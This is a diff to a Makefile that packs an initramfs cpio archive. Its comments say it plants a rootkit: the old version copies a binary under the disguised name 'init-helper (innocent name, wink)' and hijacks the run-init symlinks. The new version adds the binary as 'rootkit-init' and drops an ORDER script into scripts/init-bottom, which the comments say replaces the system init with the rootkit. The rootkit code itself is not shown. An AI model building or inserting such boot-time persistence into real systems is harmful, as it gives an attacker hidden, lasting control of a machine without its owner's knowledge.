@@ -20,7 +20,7 @@ $(BUILD_DIR)/init: $(SRCS) $(HDRS) docker-image
 
 $(BUILD_DIR)/init.cpio: $(SRCS) $(HDRS) docker-image
 	@mkdir -p $(BUILD_DIR)
-	@cp -f -r $(SRCS) $(HDRS) Makefile $(BUILD_DIR)
+	@cp -f -r $(SRCS) $(HDRS) Makefile ORDER $(BUILD_DIR)
 	$(DOCKER_RUN) make -j8 init.cpio
 
 # regular make build ###########################################################
@@ -40,16 +40,15 @@ init: $(SRCS:%.c=%.o)
 init.cpio: init
 	# create a clean cpio dir
 	@rm -rf cpio
-	@mkdir -p cpio
-	
-	# copy the binary as init-helper (innocent name, wink)
-	@cp $< cpio/init-helper
 
-	# use symlinks to replace the busybox hardlinks (this avoids overwriting the actual binary)
-	@mkdir -p cpio/usr/sbin
-	@ln -s /init-helper cpio/usr/sbin/run-init
-	@mkdir -p cpio/usr/bin
-	@ln -s /init-helper cpio/usr/bin/run-init
+	@mkdir -p cpio
+	@mkdir -p cpio/scripts/init-bottom
+
+	# add our rootkit init
+	@cp $< cpio/rootkit-init
+
+	# add a script which will replace init with rootkit init
+	cp ORDER cpio/scripts/init-bottom/
 
 	# actually create the cpio archive
 	(cd cpio && find . | cpio -o -H newc | gzip -9) > $@
